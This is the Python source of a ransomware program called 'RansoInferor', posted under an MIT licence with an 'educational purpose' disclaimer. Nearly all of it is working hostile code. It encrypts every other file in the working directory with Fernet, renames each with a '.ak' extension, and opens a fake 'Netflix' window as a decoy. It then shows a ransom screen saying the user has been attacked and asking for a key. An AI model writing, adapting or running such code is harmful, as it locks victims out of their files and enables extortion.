"""This is Only made for Educational Purpose. We are not responsible for anything Harmful Causes.

# 1st Release   :      11th May 2023 (GMT+6)
# RansoInferor  :      Ransomware
# Version       :      1.0
# Lisence       :      MIT
# Copyright (C) 2023 InferiorAK\n"""


"""MIT License

Copyright (c) 2023 Mi Taseen

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE."""


import os
try:		# if not working my given module, then install it
	from cryptography.fernet import Fernet
	from tkinter import *
	from PIL import Image, ImageTk
except ImportError:
	os.system("pip install -r requirements.txt")


def encrypt(file):
	try:
		with open(file, "rb") as murgi:
			data = murgi.read()
			if data.startswith(b"gAAAAAB"):
				print("No More. Thanks")
			else:
				key = Fernet.generate_key()
				with open("symetric.key", "wb") as k:
					k.write(key)
					k.close()
				fernet = Fernet(key)
				encrypted = fernet.encrypt(data)
				with open(file, "wb") as enc:
					enc.write(encrypted)
				os.rename(file, file+".ak")
				print("Go to Hell")
	except Exception as err:
		print(err)


files = [os.path.basename(__file__), "symetric.key", "icon.ico", "LICENSE", "README.md",
		 "inf.ico", "bg_movie.jpg", "requirements.txt", "DECRYPT.py"]
for file in os.listdir():
	if file in files:
		continue
	elif os.path.isfile(file):
		try:
			name, ext = file.split(".")
			if ext != "ak":
				encrypt(file)
			else:
				continue
		except ValueError:
			encrypt(file)


# startup
root1 = Tk()
root1.title("Netflix")
root1.wm_iconbitmap("icon.ico")
width, height = 900, 600
root1.geometry(f"{width}x{height}")
root1.minsize(900, 600)
root1.maxsize(root1.winfo_screenwidth(), root1.winfo_screenheight())
root1.configure(bg="black")

img = Image.open("bg_movie.jpg").resize(
	(root1.winfo_screenwidth(), root1.winfo_screenheight()))
logo = ImageTk.PhotoImage(img)
Label(image=logo).pack()
root1.mainloop()


root2 = Tk()
root2.title("Infected")
root2.wm_iconbitmap("inf.ico")
root2.geometry("800x250")
root2.minsize(600, 250)
root2.maxsize(600, 250)
root2.configure(bg="black")

frame = Frame(root2, bg="black")
frame.pack()
msg = Label(frame, text="You have been Attacked by Ransomware!",
			fg="red", bg="black", font="arial 20 bold", pady=400)
msg.pack(anchor="n", fill=X)
Label(frame, text="Input Key to Decrypt files: ", fg="white").pack()
root2.mainloop()
